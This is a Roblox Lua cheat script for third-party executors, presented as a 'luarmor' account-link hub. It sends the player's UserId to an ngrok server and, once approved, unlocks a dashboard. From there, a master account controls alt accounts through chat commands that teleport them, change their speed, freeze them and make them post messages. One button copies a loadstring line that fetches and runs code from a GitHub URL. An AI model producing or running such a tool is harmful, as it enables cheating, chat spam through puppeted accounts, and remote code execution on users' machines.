-- ====================================================================
-- LUARMOR SECURE LINK-VERIFY & ROLE SEPARATION GATEWAY ENVIRONMENT
-- ====================================================================
print("🚀 luarmor link-auth matrix initializing...")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- ====================================================================
-- GLOBAL PARAMS CONFIGURATION
-- ====================================================================
local MAIN_ACCOUNT_NAME = "CreammmyKeyboardTes"
local SERVER_URL = "https://underwear-candied-stool.ngrok-free.dev"

_G.WalkSpeedValue = 16
_G.JumpPowerValue = 50
_G.ESPEnabled = true

local Dancing = false
local DanceConnection = nil
local PollingActive = true

-- Clear old duplicates out of memory
if CoreGui:FindFirstChild("luarmor_LinkAuthHub") then
    CoreGui["luarmor_LinkAuthHub"]:Destroy()
end

-- Create Window Screen Component Workspace
local mainGui = Instance.new("ScreenGui")
mainGui.Name = "luarmor_LinkAuthHub"
mainGui.ResetOnSpawn = false
mainGui.Parent = CoreGui

-- --------------------------------------------------------------------
-- LAYER FRAME STAGE 1: LINK AUTHENTICATION SCREEN OVERLAY CARD
-- --------------------------------------------------------------------
local linkCard = Instance.new("Frame")
linkCard.Size = UDim2.new(0, 340, 0, 220)
linkCard.Position = UDim2.new(0.5, -170, 0.4, -110)
linkCard.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
linkCard.BorderSizePixel = 0
linkCard.Active = true
linkCard.Draggable = true
linkCard.Parent = mainGui

local linkCorners = Instance.new("UICorner")
linkCorners.CornerRadius = UDim.new(0, 10)
linkCorners.Parent = linkCard

local linkAccent = Instance.new("Frame")
linkAccent.Size = UDim2.new(1, 0, 0, 4)
linkAccent.BackgroundColor3 = Color3.fromRGB(218, 165, 32) -- Gold Accent Line
linkAccent.BorderSizePixel = 0
linkAccent.Parent = linkCard

local linkAccentCorners = Instance.new("UICorner")
linkAccentCorners.CornerRadius = UDim.new(0, 10)
linkAccentCorners.Parent = linkAccent

local linkTitle = Instance.new("TextLabel")
linkTitle.Size = UDim2.new(1, -30, 0, 45)
linkTitle.Position = UDim2.new(0, 15, 0, 4)
linkTitle.BackgroundTransparency = 1
linkTitle.Text = "luarmor account link"
linkTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
linkTitle.TextXAlignment = Enum.TextXAlignment.Left
linkTitle.Font = Enum.Font.GothamBold
linkTitle.TextSize = 18
linkTitle.Parent = linkCard

local linkSubtext = Instance.new("TextLabel")
linkSubtext.Size = UDim2.new(1, -30, 0, 35)
linkSubtext.Position = UDim2.new(0, 15, 0, 36)
linkSubtext.BackgroundTransparency = 1
linkSubtext.Text = "Copy your authorization token string below and process it inside our official Discord server channels."
linkSubtext.TextColor3 = Color3.fromRGB(140, 140, 145)
linkSubtext.TextXAlignment = Enum.TextXAlignment.Left
linkSubtext.TextWrapped = true
linkSubtext.Font = Enum.Font.GothamSemibold
linkSubtext.TextSize = 11
linkSubtext.Parent = linkCard

-- Token Value Copy Container
local tokenBox = Instance.new("Frame")
tokenBox.Size = UDim2.new(1, -30, 0, 38)
tokenBox.Position = UDim2.new(0, 15, 0, 80)
tokenBox.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
tokenBox.BorderSizePixel = 0
tokenBox.Parent = linkCard

local tokenCorner = Instance.new("UICorner")
tokenCorner.CornerRadius = UDim.new(0, 6)
tokenCorner.Parent = tokenBox

local generatedTokenString = "LUARMOR-LINK-" .. tostring(LocalPlayer.UserId)
local tokenLabel = Instance.new("TextLabel")
tokenLabel.Size = UDim2.new(1, -20, 1, 0)
tokenLabel.Position = UDim2.new(0, 10, 0, 0)
tokenLabel.BackgroundTransparency = 1
tokenLabel.Text = generatedTokenString
tokenLabel.TextColor3 = Color3.fromRGB(218, 165, 32)
tokenLabel.Font = Enum.Font.Code
tokenLabel.TextSize = 12
tokenLabel.Parent = tokenBox

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -30, 0, 20)
statusLabel.Position = UDim2.new(0, 15, 0, 128)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: Waiting for verification token hook callback..."
statusLabel.TextColor3 = Color3.fromRGB(120, 120, 125)
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Font = Enum.Font.GothamMedium
statusLabel.TextSize = 11
statusLabel.Parent = linkCard

-- Premium UI Button Factory Function
local function CreateStyledButton(text, position, parent, callback)
    local btnFrame = Instance.new("Frame")
    btnFrame.Size = UDim2.new(0, 140, 0, 36)
    btnFrame.Position = position
    btnFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    btnFrame.BorderSizePixel = 0
    btnFrame.Parent = parent

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btnFrame

    local textBtn = Instance.new("TextButton")
    textBtn.Size = UDim2.new(1, 0, 1, 0)
    textBtn.BackgroundTransparency = 1
    textBtn.Text = text
    textBtn.TextColor3 = Color3.fromRGB(245, 245, 250)
    textBtn.Font = Enum.Font.GothamBold
    textBtn.TextSize = 12
    textBtn.Parent = btnFrame

    textBtn.MouseEnter:Connect(function()
        TweenService:Create(btnFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(35, 35, 42)}):Play()
    end)
    textBtn.MouseLeave:Connect(function()
        TweenService:Create(btnFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(24, 24, 28)}):Play()
    end)

    textBtn.MouseButton1Click:Connect(callback)
    return textBtn
end

CreateStyledButton("📋 Copy Link Token", UDim2.new(0, 100, 0, 160), linkCard, function()
    setclipboard(generatedTokenString)
    statusLabel.Text = "Status: Token string successfully loaded into clipboard buffer!"
    statusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
end)

-- --------------------------------------------------------------------
-- LAYER FRAME STAGE 2: MAIN DASHBOARD CORE PANEL (HIDDEN BY DEFAULT)
-- --------------------------------------------------------------------
local mainCard = Instance.new("Frame")
mainCard.Size = UDim2.new(0, 360, 0, 300)
mainCard.Position = UDim2.new(0.5, -180, 0.4, -150)
mainCard.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
mainCard.BorderSizePixel = 0
mainCard.Active = true
mainCard.Draggable = true
mainCard.Visible = false
mainCard.Parent = mainGui

local cardCorners = Instance.new("UICorner")
cardCorners.CornerRadius = UDim.new(0, 10)
cardCorners.Parent = mainCard

local topAccent = Instance.new("Frame")
topAccent.Size = UDim2.new(1, 0, 0, 4)
topAccent.BorderSizePixel = 0
topAccent.Parent = mainCard

local accentCorners = Instance.new("UICorner")
accentCorners.CornerRadius = UDim.new(0, 10)
accentCorners.Parent = topAccent

local titleHeader = Instance.new("TextLabel")
titleHeader.Size = UDim2.new(1, -30, 0, 45)
titleHeader.Position = UDim2.new(0, 15, 0, 4)
titleHeader.BackgroundTransparency = 1
titleHeader.Text = "luarmor hub"
titleHeader.TextColor3 = Color3.fromRGB(255, 255, 255)
titleHeader.TextXAlignment = Enum.TextXAlignment.Left
titleHeader.Font = Enum.Font.GothamBold
titleHeader.TextSize = 20
titleHeader.Parent = mainCard

local statusSubtext = Instance.new("TextLabel")
statusSubtext.Size = UDim2.new(1, -30, 0, 20)
statusSubtext.Position = UDim2.new(0, 15, 0, 38)
statusSubtext.BackgroundTransparency = 1
statusSubtext.Text = "Rank Initialization Check..."
statusSubtext.TextXAlignment = Enum.TextXAlignment.Left
statusSubtext.Font = Enum.Font.GothamSemibold
statusSubtext.TextSize = 12
statusSubtext.Parent = mainCard

local divider = Instance.new("Frame")
divider.Size = UDim2.new(1, -30, 0, 1)
divider.Position = UDim2.new(0, 15, 0, 68)
divider.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
divider.BorderSizePixel = 0
divider.Parent = mainCard

-- --------------------------------------------------------------------
-- INTERFACE SETUP METHODS & RENDER LOGIC FUNCTIONS
-- --------------------------------------------------------------------
local function BuildDashboardControls(badgeColor, userTitle)
    topAccent.BackgroundColor3 = badgeColor
    statusSubtext.Text = "Identity Verification: " .. userTitle
    statusSubtext.TextColor3 = badgeColor

    CreateStyledButton("⚙️ Reset Security HWID", UDim2.new(0, 15, 0, 85), mainCard, function()
        print("🔄 Hardware tracking nodes synchronized clean.")
    end)

    CreateStyledButton("📋 Copy Session Link", UDim2.new(0, 185, 0, 85), mainCard, function()
        setclipboard("loadstring(game:HttpGet('https://raw.githubusercontent.com/Creammmy/AltControl/main/script.lua'))()")
    end)

    local espToggle = CreateStyledButton("📊 Toggle ESP: ON", UDim2.new(0, 15, 0, 135), mainCard, function() end)
    espToggle.MouseButton1Click:Connect(function()
        _G.ESPEnabled = not _G.ESPEnabled
        espToggle.Text = "📊 Toggle ESP: " .. (_G.ESPEnabled and "ON" or "OFF")
        espToggle.TextColor3 = _G.ESPEnabled and Color3.fromRGB(245, 245, 250) or Color3.fromRGB(231, 76, 60)
    end)

    CreateStyledButton("🛑 Close Client Panel", UDim2.new(0, 185, 0, 135), mainCard, function()
        mainGui:Destroy()
    end)

    local consoleBox = Instance.new("Frame")
    consoleBox.Size = UDim2.new(1, -30, 0, 85)
    consoleBox.Position = UDim2.new(0, 15, 0, 195)
    consoleBox.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    consoleBox.BorderSizePixel = 0
    consoleBox.Parent = mainCard

    local consoleCorner = Instance.new("UICorner")
    consoleCorner.CornerRadius = UDim.new(0, 6)
    consoleCorner.Parent = consoleBox

    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -20, 1, -10)
    consoleText.Position = UDim2.new(0, 10, 0, 5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = "Active Command Matrix Routing Links:\n• ;bring -> Teleport Alt to Master Player Vector\n• ;speed [n] -> Adjust Local Walking Velocities\n• ;jump [n] -> Modify Local Jumping Lift Heights\n• ;say [msg] -> Output Mirror Chat Packet Injection"
    consoleText.TextColor3 = Color3.fromRGB(150, 152, 160)
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.Font = Enum.Font.Code
    consoleText.TextSize = 11
    consoleText.LineHeight = 1.35
    consoleText.Parent = consoleBox
end

local function SwapToDashboardView()
    TweenService:Create(linkCard, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -170, -1, 0)}):Play()
    task.wait(0.4)
    linkCard.Visible = false
    mainCard.Visible = true
    mainCard.Position = UDim2.new(0.5, -180, -1, 0)
    TweenService:Create(mainCard, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -180, 0.4, -150)}):Play()
end

-- --------------------------------------------------------------------
-- BACKGROUND POLLING LAYER LOOP CONTROLLER
-- --------------------------------------------------------------------
task.spawn(function()
    local httpRequest = syn and syn.request or request
    while PollingActive do
        task.wait(3) -- Check database every 3 seconds for active link validation responses
        local success, response = pcall(function()
            return httpRequest({
                Url = SERVER_URL .. "/poll-status/" .. tostring(LocalPlayer.UserId),
                Method = "GET"
            })
        end)

        if success and response and response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data.authenticated then
                PollingActive = false
                
                local userTitle = "🛡️ Whitelisted Client"
                local badgeColor = Color3.fromRGB(46, 204, 113)

                if data.isOwner or data.isAdmin then
                    userTitle = "👑 Owner & Admin Team"
                    badgeColor = Color3.fromRGB(218, 165, 32)
                end

                BuildDashboardControls(badgeColor, userTitle)
                SwapToDashboardView()
            end
        end
    end
end)

-- ====================================================================
-- LOOPS (WALKSPEED, JUMPPOWER, ESP, & CHAT COMMAND ENGINE)
-- ====================================================================
task.spawn(function()
    while true do
        task.wait(0.1)
        local character = LocalPlayer.Character
        if character and character:FindFirstChildOfClass("Humanoid") then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            humanoid.WalkSpeed = _G.WalkSpeedValue
            if humanoid.UseJumpPower then
                humanoid.JumpPower = _G.JumpPowerValue
            else
                humanoid.JumpHeight = _G.JumpPowerValue / 3.5
            end
        end
    end
end)

local function HandleIncomingChat(msg, speaker)
    if linkCard.Visible then return end -- Block features if panel isn't unlocked yet
    if LocalPlayer.Name == MAIN_ACCOUNT_NAME then return end
    if speaker.Name ~= MAIN_ACCOUNT_NAME then return end
    
    local args = string.split(msg, " ") 
    local command = string.lower(args[1])
    local character = LocalPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    if command == ";bring" then
        local mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT_NAME)
        if mainPlayer and mainPlayer.Character and mainPlayer.Character:FindFirstChild("HumanoidRootPart") and rootPart then
            rootPart.CFrame = mainPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
        end
    end
    if command == ";speed" and args[2] and tonumber(args[2]) then _G.WalkSpeedValue = tonumber(args[2]) end
    if command == ";jump" then
        if args[2] and tonumber(args[2]) then _G.JumpPowerValue = tonumber(args[2]) elseif humanoid then humanoid.Jump = true end
    end
    if command == ";sit" and humanoid then humanoid.Sit = true end
    if command == ";freeze" and rootPart then rootPart.Anchored = true end
    if command == ";unfreeze" and rootPart then rootPart.Anchored = false end
    if command == ";dance" and rootPart and not Dancing then
        Dancing = true
        DanceConnection = RunService.Heartbeat:Connect(function()
            if rootPart and Dancing then rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(15), 0) end
        end)
    end
    if command == ";undance" and Dancing then
        Dancing = false
        if DanceConnection then DanceConnection:Disconnect() DanceConnection = nil end
    end
    if command == ";say" and #args > 1 then
        table.remove(args, 1)
        local repeatMessage = table.concat(args, " ")
        if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannels = TextChatService:FindFirstChild("TextChannels")
            local targetChannel = textChannels and (textChannels:FindFirstChild("RBXGeneral") or textChannels:FindFirstChild("RBXSystem"))
            if targetChannel then targetChannel:SendAsync(repeatMessage) end
        end
        local legacyChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if legacyChat and legacyChat:FindFirstChild("SayMessageRequest") then
            legacyChat.SayMessageRequest:FireServer(repeatMessage, "All")
        end
    end
end

if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(textMessage)
        if textMessage.TextSource then
            local speaker = Players:GetPlayerByUserId(textMessage.TextSource.UserId)
            if speaker then HandleIncomingChat(textMessage.Text, speaker) end
        end
    end)
else
    for _, player in ipairs(Players:GetPlayers()) do player.Chatted:Connect(function(msg) HandleIncomingChat(msg, player) end) end
    Players.PlayerAdded:Connect(function(player) player.Chatted:Connect(function(msg) HandleIncomingChat(msg, player) end) end)
end